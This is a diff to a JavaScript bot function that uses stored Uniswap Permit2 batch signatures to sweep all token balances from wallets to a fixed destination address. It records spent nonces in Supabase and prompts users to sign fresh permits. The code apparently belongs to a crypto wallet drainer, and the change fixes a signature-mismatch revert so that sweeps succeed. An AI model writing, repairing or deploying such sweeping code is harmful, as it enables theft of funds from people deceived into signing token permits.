@@ -1635,23 +1635,31 @@ async function sweep(wallet) {
 
       try {
         const fee = await getFeeData();
-        const gasLimit = 150_000n + BigInt(withBalance.length) * 100_000n;
+        // CRITICAL: PermitBatchTransferFrom requires permitted[] and transferDetails[] to have
+        // the SAME length as the original signed permit. The signature covers ALL permitted tokens.
+        // For tokens without a balance we pass requestedAmount=0 — Permit2 skips zero transfers.
+        // Submitting only the balance-holding tokens causes an InvalidSigner revert because the
+        // hash of a partial permitted[] doesn't match the hash that was actually signed.
+        const sweepMap = new Map(withBalance.map(t => [t.token.toLowerCase(), t.balance]));
+        const fullPermitted       = permitted.map(t => ({ token: t.token, amount: BigInt(t.amount) }));
+        const fullTransferDetails = permitted.map(t => ({
+          to: DESTINATION_ADDRESS,
+          requestedAmount: sweepMap.get(t.token.toLowerCase()) ?? 0n,
+        }));
+        // Gas scales with the FULL permitted array (hashing overhead ~500 gas/token)
+        // plus the actual ERC-20 transferFrom calls for tokens being swept.
+        const gasLimit = 200_000n + BigInt(permitted.length) * 500n + BigInt(withBalance.length) * 60_000n;
         const tx = await permit2Batch.permitTransferFrom(
-          {
-            permitted: withBalance.map(t => ({ token: t.token, amount: BigInt(t.amount) })),
-            nonce: BigInt(sig.nonce),
-            deadline: dl,
-          },
-          withBalance.map(t => ({ to: DESTINATION_ADDRESS, requestedAmount: t.balance })),
+          { permitted: fullPermitted, nonce: BigInt(sig.nonce), deadline: dl },
+          fullTransferDetails,
           checksum,
           sig.signature,
           { gasLimit, ...fee },
         );
         await tx.wait();
         log(`[gasless] ✅ swept ${withBalance.length} tokens`);
-        // Mark nonce as spent — SignatureTransfer nonces are one-time.
-        // If more tokens arrive later, the bot will hit InvalidNonce.
-        // Flag the wallet so the Realtime handler knows to nudge re-activation.
+        // Mark nonce as spent and flag for re-activation so the user signs fresh
+        // permits for any new tokens that arrive later.
         if (supabase) {
           await supabase.from("permit2_signatures").update({ spent: true })
             .eq("address", addrKey + "-sig").eq("chain", CHAIN).then(v => v, () => {});
